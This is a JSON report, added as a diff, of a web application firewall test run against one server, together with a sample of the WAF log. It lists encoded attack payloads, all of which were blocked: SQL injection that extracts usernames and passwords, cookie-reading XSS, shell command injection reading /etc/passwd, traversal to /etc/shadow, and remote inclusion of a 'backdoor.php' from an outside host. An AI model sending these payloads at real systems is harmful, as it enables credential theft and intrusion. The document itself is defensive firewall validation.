@@ -1,0 +1,297 @@
+{
+  "timestamp_utc": "2026-11-21T20:31:46.577612+00:00",
+  "target": "http://130.210.70.6",
+  "total_tests": 14,
+  "passed_tests": 14,
+  "attacks_blocked": 12,
+  "results": [
+    {
+      "id": "BASE-01",
+      "category": "baseline",
+      "name": "Normal Homepage GET",
+      "url": "http://130.210.70.6/",
+      "method": "GET",
+      "http_status": 200,
+      "expected_blocked": false,
+      "actual_blocked": false,
+      "passed": true,
+      "latency_ms": 99.2,
+      "crs_rule_hint": "None (Legitimate)",
+      "error": null
+    },
+    {
+      "id": "BASE-02",
+      "category": "baseline",
+      "name": "Normal Query Parameter",
+      "url": "http://130.210.70.6/?page=about&lang=en",
+      "method": "GET",
+      "http_status": 200,
+      "expected_blocked": false,
+      "actual_blocked": false,
+      "passed": true,
+      "latency_ms": 85.58,
+      "crs_rule_hint": "None (Legitimate)",
+      "error": null
+    },
+    {
+      "id": "SQLI-01",
+      "category": "sqli",
+      "name": "UNION SELECT Credential Extraction",
+      "url": "http://130.210.70.6/?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users--",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 80.99,
+      "crs_rule_hint": "942100 / 942190 (SQLi)",
+      "error": null
+    },
+    {
+      "id": "SQLI-02",
+      "category": "sqli",
+      "name": "Boolean Auth Bypass Tautology",
+      "url": "http://130.210.70.6/?user=admin%27+OR+%271%27%3D%271",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 85.46,
+      "crs_rule_hint": "942100 (SQLi libinjection)",
+      "error": null
+    },
+    {
+      "id": "SQLI-03",
+      "category": "sqli",
+      "name": "Time-Based Blind SQLi (SLEEP)",
+      "url": "http://130.210.70.6/?q=1%27+AND+SLEEP%285%29--",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 81.14,
+      "crs_rule_hint": "942100 / 942160 (Blind SQLi)",
+      "error": null
+    },
+    {
+      "id": "XSS-01",
+      "category": "xss",
+      "name": "Reflected Script Tag Injection",
+      "url": "http://130.210.70.6/?search=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 82.58,
+      "crs_rule_hint": "941100 / 941110 (XSS)",
+      "error": null
+    },
+    {
+      "id": "XSS-02",
+      "category": "xss",
+      "name": "IMG OnError Event Handler XSS",
+      "url": "http://130.210.70.6/?avatar=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 85.04,
+      "crs_rule_hint": "941100 / 941160 (NoScript XSS)",
+      "error": null
+    },
+    {
+      "id": "RCE-01",
+      "category": "rce",
+      "name": "Unix Command Chaining (/etc/passwd)",
+      "url": "http://130.210.70.6/?cmd=%3B+cat+%2Fetc%2Fpasswd",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 83.49,
+      "crs_rule_hint": "932100 / 932160 (Unix RCE)",
+      "error": null
+    },
+    {
+      "id": "RCE-02",
+      "category": "rce",
+      "name": "Subshell Execution ($(whoami))",
+      "url": "http://130.210.70.6/?ping=127.0.0.1+%26%26+%24%28%2Fbin%2Fsh+-c+id%29",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 83.2,
+      "crs_rule_hint": "932105 / 932150 (Command Injection)",
+      "error": null
+    },
+    {
+      "id": "RCE-03",
+      "category": "rce",
+      "name": "Shellshock Bash Env Header Attack",
+      "url": "http://130.210.70.6/",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 76.6,
+      "crs_rule_hint": "932170 (Shellshock)",
+      "error": null
+    },
+    {
+      "id": "LFI-01",
+      "category": "lfi",
+      "name": "Dot-Dot-Slash Path Traversal",
+      "url": "http://130.210.70.6/?file=..%2F..%2F..%2F..%2Fetc%2Fshadow",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 83.77,
+      "crs_rule_hint": "930100 / 930120 (LFI)",
+      "error": null
+    },
+    {
+      "id": "RFI-01",
+      "category": "lfi",
+      "name": "Remote Malicious Payload Inclusion",
+      "url": "http://130.210.70.6/?include=http%3A%2F%2F198.51.100.99%2Fbackdoor.php",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 84.14,
+      "crs_rule_hint": "931130 (RFI)",
+      "error": null
+    },
+    {
+      "id": "SCAN-01",
+      "category": "scanner",
+      "name": "SQLMap Automated Scanner Fingerprint",
+      "url": "http://130.210.70.6/",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 80.05,
+      "crs_rule_hint": "913100 (Security Scanner)",
+      "error": null
+    },
+    {
+      "id": "SCAN-02",
+      "category": "scanner",
+      "name": "Nikto Web Vulnerability Scanner",
+      "url": "http://130.210.70.6/",
+      "method": "GET",
+      "http_status": 403,
+      "expected_blocked": true,
+      "actual_blocked": true,
+      "passed": true,
+      "latency_ms": 86.75,
+      "crs_rule_hint": "913100 (Security Scanner)",
+      "error": null
+    }
+  ],
+  "remote_waf_log_sample": [
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 23)",
+      "request": "GET /?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users-- HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 8)",
+      "request": "GET /?user=admin%27+OR+%271%27%3D%271 HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 13)",
+      "request": "GET /?q=1%27+AND+SLEEP%285%29-- HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 23)",
+      "request": "GET /?id=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users-- HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 8)",
+      "request": "GET /?user=admin%27+OR+%271%27%3D%271 HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 13)",
+      "request": "GET /?q=1%27+AND+SLEEP%285%29-- HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 23)",
+      "request": "GET /?search=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 18)",
+      "request": "GET /?avatar=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 18)",
+      "request": "GET /?cmd=%3B+cat+%2Fetc%2Fpasswd HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 18)",
+      "request": "GET /?ping=127.0.0.1+%26%26+%24%28%2Fbin%2Fsh+-c+id%29 HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 8)",
+      "request": "GET / HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 33)",
+      "request": "GET /?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 8)",
+      "request": "GET /?include=http%3A%2F%2F198.51.100.99%2Fbackdoor.php HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 8)",
+      "request": "GET / HTTP/1.1"
+    },
+    {
+      "client": "112.134.158.200",
+      "rule_id": "949110",
+      "message": "Inbound Anomaly Score Exceeded (Total Score: 8)",
+      "request": "GET / HTTP/1.1"
+    }
+  ]
+}
